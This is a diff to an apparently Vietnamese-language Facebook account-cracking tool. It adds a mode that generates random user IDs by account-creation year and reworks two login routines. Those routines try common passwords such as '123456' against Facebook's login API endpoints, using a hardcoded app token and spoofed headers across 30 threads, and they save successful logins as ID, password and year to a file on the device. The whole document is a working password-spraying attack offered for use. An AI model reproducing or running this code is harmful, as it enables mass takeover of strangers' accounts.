@@ -15,8 +15,6 @@ from concurrent.futures import ThreadPoolExecutor as tred
 from os import system
 from datetime import datetime
 
-import os, sys
-
 modules = ['requests', 'urllib3', 'mechanize', 'rich']
 for module in modules:
     try:
@@ -78,6 +76,7 @@ oks = []
 cps = []
 loop = 0
 user = []
+account_count = 0
 
 X = '\x1b[1;37m'
 rad = '\x1b[38;5;21m'
@@ -138,7 +137,7 @@ def ____banner____():
     print('=== TOOL ĐÀO VIA CỔ NG HOANG KHANH NAM x LE NGOC ANH ===')
     print('Cập nhật: 30/9/2025')
     print(f'Thời gian hiện tại: {thoi_gian_hien_tai}')
-    print('Phiên Bản: v4')
+    print('Phiên Bản: v10')
     print('Zalo Admin Knam: 0868371089')
     print('Zalo Admin Nanh: 0339992592')
     
@@ -182,6 +181,10 @@ def creationyear(uid):
             return '2023'
         if uid.startswith(('10007', '10008')):
             return '2022'
+        if uid.startswith('1001'):
+            return '2024'
+        if uid.startswith('1002'):
+            return '2025'
         return ''
     elif len(uid) in (9, 10):
         return '2008'
@@ -189,6 +192,10 @@ def creationyear(uid):
         return '2007'
     elif len(uid) == 7:
         return '2006'
+    elif len(uid) == 6:
+        return '2005'
+    elif len(uid) == 5:
+        return '2004'
     elif len(uid) == 14 and uid.startswith('61'):
         return '2024'
     else:
@@ -201,7 +208,6 @@ def linex():
     print('\x1b[38;5;21m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 def dzixtool2006_knam():
-	
     ____banner____()
     print('\x1b[38;5;21m(\x1b[1;37mA\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93mCLONE VIA CŨ')
     linex()
@@ -221,6 +227,8 @@ def old_clone():
     linex()
     print('\x1b[38;5;21m(\x1b[1;37mC\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93mTÀI KHOẢN 2009')
     linex()
+    print('\x1b[38;5;21m(\x1b[1;37mD\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93mTÀI KHOẢN 2004-2025')
+    linex()
     _input = input(f"\x1b[38;5;21m\x1b[1;37m\x1b[38;5;21m\x1b[1;37m\x1b[38;5;93mCHỌN  {W}: {Y}")
     if _input in ('A', 'a', '01', '1'):
         old_One()
@@ -228,6 +236,8 @@ def old_clone():
         old_Tow()
     elif _input in ('C', 'c', '03', '3'):
         old_Tree()
+    elif _input in ('D', 'd', '04', '4'):
+        old_Four()
     else:
         print(f"\n[×]{rad} Vui lòng chọn tùy chọn hợp lệ... ")
         dzixtool2006_knam()
@@ -272,8 +282,8 @@ def old_Tow():
     ask = input(f"\x1b[38;5;21m\x1b[1;37m\x1b[38;5;21m\x1b[1;37m\x1b[38;5;93mCHỌN {Y}:{G} ")
     linex()
     ____banner____()
-    print(f"\x1b[38;5;21m\x1b[1;37m\x1b[38;5;21m\x1b[1;37m\x1b[38;5;93mVÍ DỤ {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"\x1b[38;5;21m\x1b[1;37m\x1b[38;5;21m\x1b[1;37m\x1b[38;5;93mCHỌN {Y}:{G} ")
+    print(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mVÍ DỤ {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mCHỌN {Y}:{G} ")
     linex()
     prefixes = ['100003', '100004']
     for _ in range(int(limit)):
@@ -281,10 +291,10 @@ def old_Tow():
         suffix = ''.join(random.choices('0123456789', k=9))
         uid = prefix + suffix
         user.append(uid)
-    print('\x1b[38;5;21m(\x1b[1;37mA\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93mPHƯƠNG THỨC A')
-    print('\x1b[38;5;21m(\x1b[1;37mB\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93mPHƯƠNG THỨC B')
+    print('\x1b[38;5;21m(\x1b[1;37mA\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mPHƯƠNG THỨC A')
+    print('\x1b[38;5;21m(\x1b[1;37mB\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mPHƯƠNG THỨC B')
     linex()
-    meth = input(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mCHỌN {W}(A/B): {Y}").strip().upper()
+    meth = input(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mCHỌN {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
         print(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mTỔNG SỐ ID ĐỂ KIỂM TRA {Y}: {G} {limit}{W}")
@@ -314,10 +324,102 @@ def old_Tree():
         suffix = ''.join(random.choices('0123456789', k=8))
         uid = prefix + suffix
         user.append(uid)
-    print('\x1b[38;5;21m(\x1b[1;37mA\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93mPHƯƠNG THỨC A')
-    print('\x1b[38;5;21m(\x1b[1;37mB\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93mPHƯƠNG THỨC B')
+    print('\x1b[38;5;21m(\x1b[1;37mA\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mPHƯƠNG THỨC A')
+    print('\x1b[38;5;21m(\x1b[1;37mB\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mPHƯƠNG THỨC B')
     linex()
-    meth = input(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mCHỌN {W}(A/B): {Y}").strip().upper()
+    meth = input(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mCHỌN {W}(A/B): {Y}").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mTỔNG SỐ ID ĐỂ KIỂM TRA {Y}: {G}{limit}{W}")
+        print(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mSỬ DỤNG CHẾ ĐỘ MÁY BAY ĐỂ CÓ KẾT QUẢ TỐT{G}")
+        linex()
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] PHƯƠNG THỨC CHỌN KHÔNG HỢP LỆ")
+                break
+
+def old_Four():
+    user = []
+    ____banner____()
+    print(f"\x1b[38;5;21m\x1b[1;37m\x1b[38;5;21m\x1b[1;37m\x1b[38;5;93mMÃ CŨ {Y}:{G} 2004-2025")
+    year_range = input(f"\x1b[38;5;21m\x1b[1;37m\x1b[38;5;21m\x1b[1;37m\x1b[38;5;93mNHẬP KHOẢNG NĂM (VD: 2004-2025) {Y}:{G} ")
+    try:
+        start_year, end_year = map(int, year_range.split('-'))
+        if not (2004 <= start_year <= end_year <= 2025):
+            print(f"\n[×]{rad} Vui lòng nhập khoảng năm hợp lệ (2004-2025)...")
+            time.sleep(2)
+            old_clone()
+    except ValueError:
+        print(f"\n[×]{rad} Định dạng không hợp lệ. Vui lòng nhập theo dạng 2004-2025...")
+        time.sleep(2)
+        old_clone()
+    linex()
+    ____banner____()
+    print(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mVÍ DỤ {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mTỔNG SỐ ID ĐỂ KIỂM TRA {Y}:{G} ")
+    linex()
+    prefixes = []
+    for year in range(start_year, end_year + 1):
+        if year == 2004:
+            prefixes.extend(['1' + '0' * (4 - len(str(i))) + str(i) for i in range(10000, 100000)])
+        elif year == 2005:
+            prefixes.extend(['1' + '0' * (5 - len(str(i))) + str(i) for i in range(100000, 1000000)])
+        elif year == 2006:
+            prefixes.extend(['1' + '0' * (6 - len(str(i))) + str(i) for i in range(1000000, 10000000)])
+        elif year == 2007:
+            prefixes.extend(['1' + '0' * (7 - len(str(i))) + str(i) for i in range(10000000, 100000000)])
+        elif year == 2008:
+            prefixes.extend(['1' + '0' * (8 - len(str(i))) + str(i) for i in range(100000000, 1000000000)])
+        elif year == 2009:
+            prefixes.extend(['1000000', '1000001', '1000002', '1000003', '1000004', '1000005', '100000000', '1000000000'])
+        elif year == 2010:
+            prefixes.extend(['1000006', '1000007', '1000008', '1000009', '100001'])
+        elif year == 2011:
+            prefixes.extend(['100002', '100003'])
+        elif year == 2012:
+            prefixes.append('100004')
+        elif year == 2013:
+            prefixes.extend(['100005', '100006'])
+        elif year == 2014:
+            prefixes.extend(['100007', '100008'])
+        elif year == 2015:
+            prefixes.append('100009')
+        elif year == 2016:
+            prefixes.append('10001')
+        elif year == 2017:
+            prefixes.append('10002')
+        elif year == 2018:
+            prefixes.append('10003')
+        elif year == 2019:
+            prefixes.append('10004')
+        elif year == 2020:
+            prefixes.append('10005')
+        elif year == 2021:
+            prefixes.append('10006')
+        elif year == 2022:
+            prefixes.extend(['10007', '10008'])
+        elif year == 2023:
+            prefixes.append('10009')
+        elif year == 2024:
+            prefixes.extend(['1001', '61'])
+        elif year == 2025:
+            prefixes.append('1002')
+    for _ in range(int(limit)):
+        prefix = random.choice(prefixes)
+        if prefix in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005', '1000006', '1000007', '1000008', '1000009', '100001', '100002', '100003', '100004', '100005', '100006', '100007', '100008', '100009', '10001', '10002', '10003', '10004', '10005', '10006', '10007', '10008', '10009', '1001', '1002', '61']:
+            suffix = ''.join(random.choices('0123456789', k=15 - len(prefix)))
+        else:
+            suffix = ''.join(random.choices('0123456789', k=len(prefix) - 1))
+        uid = prefix + suffix
+        user.append(uid)
+    print('\x1b[38;5;21m(\x1b[1;37mA\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mPHƯƠNG THỨC A')
+    print('\x1b[38;5;21m(\x1b[1;37mB\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mPHƯƠNG THỨC B')
+    linex()
+    meth = input(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mCHỌN {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
         print(f"\x1b[38;5;21m(\x1b[1;37m★\x1b[38;5;21m)\x1b[1;37m>\x1b[38;5;21m×\x1b[1;37m<\x1b[38;5;93mTỔNG SỐ ID ĐỂ KIỂM TRA {Y}: {G}{limit}{W}")
@@ -333,7 +435,7 @@ def old_Tree():
                 break
 
 def login_1(uid):
-    global loop
+    global loop, account_count
     session = requests.session()
     try:
         sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;21m+\x1b[1;37m\x1b[38;5;21m(\x1b[1;37mDZIXTOOL\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93m\x1b[1;37m\x1b[38;5;93m(\x1b[38;5;192m{loop}\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93m\x1b[1;37m\x1b[38;5;93m(\x1b[1;37mOK\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93m\x1b[1;37m\x1b[38;5;93m(\x1b[38;5;192m{len(oks)}\x1b[38;5;21m)")
@@ -380,14 +482,14 @@ def login_1(uid):
                 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
-            if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;21m├Ч\x1b[1;37m<\x1b[38;5;21m(\x1b[1;37mDZIXTOOL2006\x1b[38;5;21m) \x1b[1;97m= \x1b[38;5;93m{uid} \x1b[1;97m= \x1b[38;5;93m{pw} \x1b[1;97m= \x1b[38;5;93m{creationyear(uid)}")
-                open('/sdcard/viabydzi1.txt', 'a').write(f"{uid}|{pw}\n")
-                oks.append(uid)
-                break
-            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;21m\x1b[1;37m\x1b[38;5;21m(\x1b[1;37mDZIXTOOL2006\x1b[38;5;21m) \x1b[1;97m= \x1b[38;5;93m{uid} \x1b[1;97m= \x1b[38;5;93m{pw} \x1b[1;97m= \x1b[38;5;93m{creationyear(uid)}")
-                open('/sdcard/viabydzi1.txt', 'a').write(f"{uid}|{pw}\n")
+            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                account_count += 1
+                print(f"\r\r\x1b[1;37m\x1b[38;5;21mFacebook cổ {account_count}")
+                print(f"\x1b[1;37m\x1b[38;5;93mTài khoản: {uid}")
+                print(f"\x1b[1;37m\x1b[38;5;93mMật khẩu: {pw}")
+                print(f"\x1b[1;37m\x1b[38;5;93mNăm sinh: {creationyear(uid)}")
+                print("\x1b[38;5;21m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+                open('/sdcard/viabydzi3.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                 oks.append(uid)
                 break
         loop += 1
@@ -395,10 +497,11 @@ def login_1(uid):
         time.sleep(5)
 
 def login_2(uid):
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;21m+\x1b[1;37m\x1b[38;5;21m(\x1b[1;37mDZIXTOOL2006-M2\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93m\x1b[1;37m\x1b[38;5;93m(\x1b[38;5;192m{loop}\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93m\x1b[1;37m\x1b[38;5;93m(\x1b[1;37mOK\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93m\x1b[1;37m\x1b[38;5;93m(\x1b[38;5;192m{len(oks)}\x1b[38;5;21m)")
-    
-    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
-        try:
+    global loop, account_count
+    try:
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;21m+\x1b[1;37m\x1b[38;5;21m(\x1b[1;37mDZIXTOOL2006-M2\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93m\x1b[1;37m\x1b[38;5;93m(\x1b[38;5;192m{loop}\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93m\x1b[1;37m\x1b[38;5;93m(\x1b[1;37mOK\x1b[38;5;21m)\x1b[1;37m\x1b[38;5;93m\x1b[1;37m\x1b[38;5;93m(\x1b[38;5;192m{len(oks)}\x1b[38;5;21m)")
+        sys.stdout.flush()
+        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
             with requests.Session() as session:
                 headers = {
                     'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
@@ -410,20 +513,30 @@ def login_2(uid):
                     'content-type': 'application/x-www-form-urlencoded',
                     'x-fb-http-engine': 'Liger'
                 }
-                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;21m\x1b[1;37m<\x1b[38;5;21m(\x1b[1;37mDZIXTOOL2006\x1b[38;5;21m) \x1b[1;97m= \x1b[38;5;93m{uid} \x1b[1;97m= \x1b[38;5;93m{pw} \x1b[1;97m= \x1b[38;5;93m{creationyear(uid)}")
-                    open('/sdcard/viabydzi.txt', 'a').write(f"{uid}|{pw}\n")
+                    account_count += 1
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;21mFacebook cổ {account_count}")
+                    print(f"\x1b[1;37m\x1b[38;5;93mTài khoản: {uid}")
+                    print(f"\x1b[1;37m\x1b[38;5;93mMật khẩu: {pw}")
+                    print(f"\x1b[1;37m\x1b[38;5;93mNăm sinh: {creationyear(uid)}")
+                    print("\x1b[38;5;21m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+                    open('/sdcard/viabydzi3.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;21m\x1b[1;37m\x1b[38;5;21m(\x1b[1;37mDZIXTOOL2006\x1b[38;5;21m) \x1b[1;97m= \x1b[38;5;93m{uid} \x1b[1;97m= \x1b[38;5;93m{pw} \x1b[1;97m= \x1b[38;5;93m{creationyear(uid)}")
-                    open('/sdcard/viabydzi.txt', 'a').write(f"{uid}|{pw}\n")
+                    account_count += 1
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;21mFacebook cổ {account_count}")
+                    print(f"\x1b[1;37m\x1b[38;5;93mTài khoản: {uid}")
+                    print(f"\x1b[1;37m\x1b[38;5;93mMật khẩu: {pw}")
+                    print(f"\x1b[1;37m\x1b[38;5;93mNăm sinh: {creationyear(uid)}")
+                    print("\x1b[38;5;21m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+                    open('/sdcard/viabydzi3.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                     oks.append(uid)
                     break
-        except Exception as e:
-            pass
+    except Exception as e:
+        pass
     loop += 1
 
 if __name__ == '__main__':
